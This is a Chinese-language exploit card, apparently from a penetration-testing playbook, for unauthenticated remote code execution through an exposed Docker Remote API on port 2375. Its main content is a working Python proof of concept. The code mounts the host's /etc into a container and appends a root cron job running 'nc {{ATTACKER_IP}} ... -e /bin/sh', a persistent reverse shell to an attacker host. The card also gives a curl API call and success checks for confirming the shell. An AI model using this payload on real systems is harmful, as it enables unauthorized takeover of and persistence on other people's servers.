# Docker Remote API Unauthorized RCE

## 指纹特征
- 服务: Docker Engine (dockerd)
- 端口: 2375 (TCP, 非加密), 2376 (TCP, TLS)
- 协议: HTTP (Docker API)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| API 未授权访问 | `/containers/create`, `/containers/run` | 无 |

## PoC 指令

通过 Docker API 创建容器并挂载宿主机根目录（或 `/etc`），实现对宿主机的持久化控制。

**1. 利用 Python `docker` 库注入 crontab**
```python
import docker

client = docker.DockerClient(base_url='http://{{TARGET}}:2375/')
# 挂载宿主机 /etc 到容器 /tmp/etc，并向 crontabs/root 写入反弹 shell 命令
client.containers.run(
    'alpine:latest', 
    r'''sh -c "echo '* * * * * /usr/bin/nc {{ATTACKER_IP}} {{PORT}} -e /bin/sh' >> /tmp/etc/crontabs/root" ''', 
    remove=True, 
    volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}
)
```

**2. 使用 `curl` 调用 API (示例: 列出镜像)**
```bash
curl http://{{TARGET}}:2375/images/json
```

## Success Signal
- **响应验证**: API 返回 200/201 状态码及 JSON 结果。
- **反弹验证**: 攻击者在指定端口（如 21）收到来自宿主机的反弹 Shell。
- **持久化检查**: 宿主机 `/etc/crontabs/root` 文件包含注入的恶意命令。
